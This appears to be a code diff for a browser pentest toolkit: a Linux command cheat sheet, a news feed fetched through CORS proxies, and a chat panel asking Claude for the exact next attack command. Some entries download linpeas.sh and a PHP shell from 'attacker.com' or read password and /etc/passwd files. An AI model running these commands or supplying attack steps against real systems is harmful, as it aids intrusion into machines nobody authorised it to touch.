+            { cat: "system", name: "free", desc: "Show free and used RAM in human-readable format", usage: "free -h" },
+            { cat: "system", name: "df / du", desc: "Show disk space usage or specific directory sizes", usage: "df -h\ndu -sh [dir]" },
+            { cat: "system", name: "date", desc: "Show the current system date and time", usage: "date" },
+
+            // Users & Privileges
+            { cat: "system", name: "whoami / id", desc: "Show logged-in username and active user/group IDs", usage: "whoami\nid" },
+            { cat: "system", name: "sudo / su", desc: "Execute command as root or switch user to root", usage: "sudo [cmd]\nsu -" },
+            { cat: "system", name: "passwd", desc: "Change your current user password", usage: "passwd" },
+            { cat: "system", name: "useradd / usermod", desc: "Create a user or add a user to a specific group", usage: "useradd [user]\nusermod -aG [grp] [user]\nuserdel [user]" },
+            { cat: "system", name: "chmod", desc: "Change file permissions (e.g., make executable)", usage: "chmod 777 [file]\nchmod +x [file]" },
+            { cat: "system", name: "chown", desc: "Change the owner and group of a file", usage: "chown [user]:[grp] [file]" },
+
+            // Searching & Text Processing (Adding to existing ones)
+            { cat: "system", name: "find", desc: "Search the entire filesystem for a file by name", usage: "find / -name [file]" },
+            { cat: "system", name: "locate", desc: "Quickly find a file (requires updatedb)", usage: "locate [file]" },
+            { cat: "system", name: "which", desc: "Show the exact executable path of a command", usage: "which [cmd]" },
+            { cat: "system", name: "sort / uniq", desc: "Sort text alphabetically and filter repeated lines", usage: "sort [file]\nuniq -c" },
+            { cat: "system", name: "wc", desc: "Count the number of lines in a file", usage: "wc -l [file]" },
+            
+            // Process & Service Management
+            { cat: "system", name: "top / htop", desc: "Interactive real-time process viewer", usage: "top\nhtop" },
+            { cat: "system", name: "ps", desc: "List all currently running processes", usage: "ps aux" },
+            { cat: "system", name: "kill / killall", desc: "Terminate a process gracefully or forcefully", usage: "kill [PID]\nkill -9 [PID]\nkillall [name]" },
+            { cat: "system", name: "bg / fg", desc: "Send process to background or bring to foreground", usage: "bg\nfg" },
+            { cat: "system", name: "systemctl", desc: "Manage background services (start, enable, status)", usage: "systemctl start [svc]\nsystemctl enable [svc]\nsystemctl status [svc]" },
+
+            // Archiving & Compression
+            { cat: "system", name: "tar", desc: "Create or extract .tar and .tar.gz archives", usage: "tar -cvf [arc.tar] [dir]\ntar -xvf [arc.tar]\ntar -czvf [arc.tgz] [dir]\ntar -xzvf [arc.tgz]" },
+            { cat: "system", name: "zip / unzip", desc: "Zip a directory recursively or extract a .zip", usage: "zip -r [arc.zip] [dir]\nunzip [arc.zip]" },
+            { cat: "system", name: "gzip", desc: "Compress a file into .gz format", usage: "gzip [file]" },
+
+            // Package Management
+            { cat: "system", name: "apt", desc: "Advanced Package Tool. Update, upgrade, install, remove", usage: "apt update && apt upgrade\napt install [pkg]\napt remove [pkg]\napt autoremove" },
+            { cat: "system", name: "dpkg", desc: "Manually install a downloaded .deb package", usage: "dpkg -i [file.deb]" },
+
+            // Useful System Commands (Originals preserved)
+            { cat: "system", name: "grep", desc: "Search text patterns in files and command output.", usage: "grep -rni 'password' /var/www/\ngrep -E '^[0-9]+' file.txt\ngrep -v '#' config.conf" },
+            { cat: "system", name: "awk / sed", desc: "Text processing. Extract fields and transform output.", usage: "awk -F: '{print $1}' /etc/passwd\nsed 's/old/new/g' file.txt" },
+            { cat: "system", name: "ssh", desc: "Secure remote access and tunneling.", usage: "ssh -i id_rsa user@target\nssh user@target 'cat /etc/passwd'" },
+            { cat: "system", name: "screen / tmux", desc: "Terminal multiplexer. Persist sessions.", usage: "tmux new -s pentest\ntmux attach -t pentest\nscreen -r session_name" },
+            { cat: "system", name: "curl / wget", desc: "File download and HTTP requests.", usage: "curl -O http://attacker.com/linpeas.sh\nwget http://attacker.com/shell.php -O /tmp/s.php" }
+        ];
+
+        let currentFilter = 'all';
+
+        function setCategory(cat) {
+            currentFilter = cat;
+            document.querySelectorAll('.cat-pill').forEach(pill => pill.classList.remove('active'));
+            event.target.classList.add('active');
+            renderDB();
+        }
+
+        function renderDB() {
+            const tbody = document.getElementById('dbBody');
+            const searchQ = document.getElementById('globalSearch').value.toLowerCase();
+            tbody.innerHTML = '';
+
+            const filtered = database.filter(item => {
+                const matchesCat = (currentFilter === 'all') || (item.cat === currentFilter);
+                const matchesSearch = item.name.toLowerCase().includes(searchQ) || 
+                                      item.desc.toLowerCase().includes(searchQ) || 
+                                      item.usage.toLowerCase().includes(searchQ);
+                return matchesCat && matchesSearch;
+            });
+
+            if(filtered.length === 0) {
+                tbody.innerHTML = `<tr><td colspan="3" style="text-align:center; color: var(--text-muted);">No entries found matching criteria.</td></tr>`;
+                return;
+            }
+
+            filtered.forEach(item => {
+                const tr = document.createElement('tr');
+                tr.innerHTML = `
+                    <td class="col-tool">> ${item.name}</td>
+                    <td class="col-desc">${item.desc}</td>
+                    <td class="col-usage"><div class="usage-code">${item.usage}</div></td>
+                `;
+                tbody.appendChild(tr);
+            });
+        }
+
+        // ==========================================
+        // 2. APP INITIALIZATION & NAVIGATION
+        // ==========================================
+        document.addEventListener("DOMContentLoaded", () => {
+            renderDB(); // Initial Load
+            
+            const savedKey = localStorage.getItem("copilot_claude_key");
+            if (savedKey) document.getElementById('claudeKey').value = savedKey;
+            
+            if(window.innerWidth <= 768) {
+                const nav = document.getElementById('desktopNav');
+                document.body.appendChild(nav); 
+            }
+        });
+
+        function switchTab(tabId) {
+            document.querySelectorAll('.view-section').forEach(el => el.classList.remove('active'));
+            document.querySelectorAll('.tab-btn').forEach(el => el.classList.remove('active'));
+            document.getElementById(tabId).classList.add('active');
+            
+            const buttons = document.querySelectorAll(`.tab-btn[onclick="switchTab('${tabId}')"]`);
+            buttons.forEach(btn => btn.classList.add('active'));
+            
+            if(tabId === 'intel-tab' && document.getElementById('intelGrid').innerHTML.trim() === '') {
+                fetchThreatIntel();
+            }
+            if(tabId === 'pgpt-tab') {
+                document.getElementById('pgptOutput').scrollTop = document.getElementById('pgptOutput').scrollHeight;
+            }
+        }
+
+// ==========================================
+        // 3. ULTIMATE BYPASS NEWS ENGINE (30+ ITEMS)
+        // ==========================================
+        async function fetchThreatIntel() {
+            const grid = document.getElementById('intelGrid');
+            grid.innerHTML = '<div style="color: var(--accent-primary); font-family: var(--font-mono); grid-column: 1/-1;">[SYS] Tunneling through Google Proxy for Live Feeds...</div>';
+            
+            const rssUrl = 'https://news.google.com/rss/search?q=technology&hl=ml&gl=IN&ceid=IN:ml';
+            
+            // We use different proxy types to ensure one breaks through
+            const proxies = [
+                `https://api.allorigins.win/get?url=${encodeURIComponent(rssUrl)}`,
+                `https://api.codetabs.com/v1/proxy?quest=${encodeURIComponent(rssUrl)}`,
+                `https://corsproxy.io/?${encodeURIComponent(rssUrl)}`
+            ];
+
+            let items = [];
+
+            for (let proxy of proxies) {
+                try {
+                    const response = await fetch(proxy);
+                    if (!response.ok) continue;
+
+                    const data = await response.json();
+                    const xmlText = data.contents || await response.text();
+                    
+                    // Manual XML Parsing (Most reliable way to avoid API errors)
+                    const parser = new DOMParser();
+                    const xmlDoc = parser.parseFromString(xmlText, "text/xml");
+                    const nodes = Array.from(xmlDoc.querySelectorAll("item"));
+                    
+                    items = nodes.map(node => ({
+                        title: node.querySelector("title")?.textContent,
+                        link: node.querySelector("link")?.textContent,
+                        pubDate: node.querySelector("pubDate")?.textContent,
+                        description: node.querySelector("description")?.textContent
+                    }));
+
+                    if (items.length > 5) break; // Success!
+                } catch (e) {
+                    console.warn("[SYS] Proxy node rejected. Trying next tunnel...");
+                }
+            }
+
+            // FINAL RENDER LOGIC
+            if (items.length > 0) {
+                grid.innerHTML = ''; 
+                // Display 30+ news items
+                items.slice(0, 35).forEach(item => {
+                    let cleanDesc = (item.description || "").replace(/<[^>]*>?/gm, '').replace(/&nbsp;/g, ' ').trim();
+                    cleanDesc = cleanDesc.length > 150 ? cleanDesc.substring(0, 150) + '...' : cleanDesc;
+                    
+                    let dateStr = "";
+                    try {
+                        dateStr = new Date(item.pubDate).toLocaleDateString('en-IN', { day: '2-digit', month: 'short' }).toUpperCase();
+                    } catch(e) { dateStr = "LIVE"; }
+
+                    const card = document.createElement('div');
+                    card.className = 'intel-card';
+                    card.style.animation = "fadeUp 0.3s ease-out forwards";
+                    card.innerHTML = `
+                        <div class="intel-date" style="display:flex; justify-content:space-between;">
+                            <span>${dateStr}</span>
+                            <span style="color: var(--accent-secondary); font-size: 0.65rem; font-weight:bold;">[ TUNNEL_ACTIVE ]</span>
+                        </div>
+                        <a href="${item.link}" target="_blank" class="intel-title" style="font-family: 'Anek Malayalam', sans-serif; line-height: 1.5; font-size: 1.05rem; display:block; margin-top:5px;">${item.title}</a>
+                        <div class="intel-desc" style="font-family: 'Anek Malayalam', sans-serif; color: var(--text-muted); font-size:0.9rem;">${cleanDesc}</div>
+                    `;
+                    grid.appendChild(card);
+                });
+            } else {
+                grid.innerHTML = `<div style="color: var(--danger); font-family: var(--font-mono); grid-column: 1/-1;">
+                    [FATAL] Local Network is dropping external API packets.<br><br>
+                    <b>LAST RESORT FIX:</b><br>
+                    1. Open Chrome/Brave Settings -> Privacy & Security.<br>
+                    2. Go to <b>"Security"</b> and turn off <b>"Use secure DNS"</b> or switch to Google DNS.<br>
+                    3. Refresh the page.
+                </div>`;
+            }
+        }
+
+        // ==========================================
+        // 4. CLAUDE COPILOT ENGINE
+        // ==========================================
+        function saveApiKey() {
+            const key = document.getElementById('claudeKey').value.trim();
+            localStorage.setItem("copilot_claude_key", key);
+        }
+
+        const pgptOutput = document.getElementById('pgptOutput');
+        const pgptInput = document.getElementById('pgptInput');
+        const pgptSendBtn = document.getElementById('pgptSendBtn');
+
+        let pentestMemory = [];
+
+        function parseMarkdown(text) {
+            return text.replace(/^### (.*$)/gim, '<h3>$1</h3>')
+                       .replace(/^## (.*$)/gim, '<h2>$1</h2>')
+                       .replace(/^# (.*$)/gim, '<h1>$1</h1>')
+                       .replace(/\*\*(.*?)\*\*/g, '<strong>$1</strong>')
+                       .replace(/```([\s\S]*?)```/g, '<pre><code>$1</code></pre>')
+                       .replace(/`(.*?)`/g, '<code>$1</code>')
+                       .replace(/\n/g, '<br>');
+        }
+
+        function appendMessage(text, role, isLoading = false) {
+            const bubble = document.createElement('div');
+            bubble.className = `pgpt-bubble ${role}`;
+            
+            if (isLoading) {
+                bubble.id = "loadingBubble";
+                bubble.innerHTML = `<span class="loading-dots" style="font-family: var(--font-mono); color: var(--accent-primary);">Analyzing payload</span>`;
+            } else {
+                bubble.innerHTML = role === 'bot' ? parseMarkdown(text) : `<pre style="background:transparent; border:none; color:inherit; margin:0; padding:0; white-space: pre-wrap; font-family: var(--font-mono);">${text}</pre>`;
+            }
+            
+            pgptOutput.appendChild(bubble);
+            pgptOutput.scrollTop = pgptOutput.scrollHeight;
+        }
+
+        function clearPentest() {
+            pentestMemory = [];
+            pgptOutput.innerHTML = `
+                <div class="pgpt-bubble bot">
+                    <h3>> MEMORY_PURGED</h3>
+                    <p>Session state cleared. Awaiting new terminal output.</p>
+                </div>`;
+        }
+
+        async function executeCopilot() {
+            const rawOutput = pgptInput.value.trim();
+            const apiKey = document.getElementById('claudeKey').value.trim();
+
+            if (!rawOutput) return;
+            if (!apiKey) {
+                appendMessage("[ERROR] Auth Token Missing. Provide Anthropic API Key in the settings bar.", "bot");
+                return;
+            }
+
+            const displayOutput = rawOutput.length > 300 ? rawOutput.substring(0, 300) + "\n\n... [TRUNCATED] ..." : rawOutput;
+            appendMessage("> " + displayOutput, 'user');
+            pgptInput.value = '';
+
+            appendMessage("", 'bot', true);
+
+            const endpoint = `https://api.anthropic.com/v1/messages`;
+            
+            const systemPrompt = `You are a senior ethical hacker copilot. The user will provide raw terminal output from security tools. 
+            You MUST respond in this exact format:
+            ### 🔍 Analysis
+            (Brief 2-3 sentence summary of what the tool found)
+            ### 🚩 Attack Vectors
+            (Bullet point list of potential vulnerabilities found)
+            ### 💻 Next Command
+            (Provide the EXACT bash terminal command the user should run next, formatted inside a \`\`\` codeblock. Provide ONLY ONE command that is the most logical next step.)`;
+
+            pentestMemory.push({ role: "user", content: `Tool Output to analyze:\n${rawOutput}` });
+
+            const payload = {
+                model: "claude-3-haiku-20240307", 
+                max_tokens: 1000,
+                system: systemPrompt,
+                messages: pentestMemory,
+                temperature: 0.2 
+            };
+
+            try {
+                const response = await fetch(endpoint, {
+                    method: 'POST',
+                    headers: { 
+                        'Content-Type': 'application/json',
+                        'x-api-key': apiKey,
+                        'anthropic-version': '2023-06-01',
+                        'anthropic-dangerous-direct-browser-access': 'true' 
+                    },
+                    body: JSON.stringify(payload)
+                });
+
+                if (!response.ok) {
+                    const errData = await response.json().catch(() => ({}));
+                    throw new Error(errData.error?.message || `HTTP Error ${response.status}`);
+                }
+
+                const result = await response.json();
+                const aiResponse = result.content[0].text;
+
+                const loadingBubble = document.getElementById('loadingBubble');
+                if (loadingBubble) loadingBubble.remove();
+
+                pentestMemory.push({ role: "assistant", content: aiResponse });
+                appendMessage(aiResponse, 'bot');
+
+            } catch (error) {
+                const loadingBubble = document.getElementById('loadingBubble');
+                if (loadingBubble) loadingBubble.remove();
+                
+                pentestMemory.pop(); 
+                appendMessage(`[API ERROR] ${error.message}`, "bot");
+            }
+        }
+
+        pgptSendBtn.addEventListener('click', executeCopilot);
+
+    </script>
+</body>
+</html>
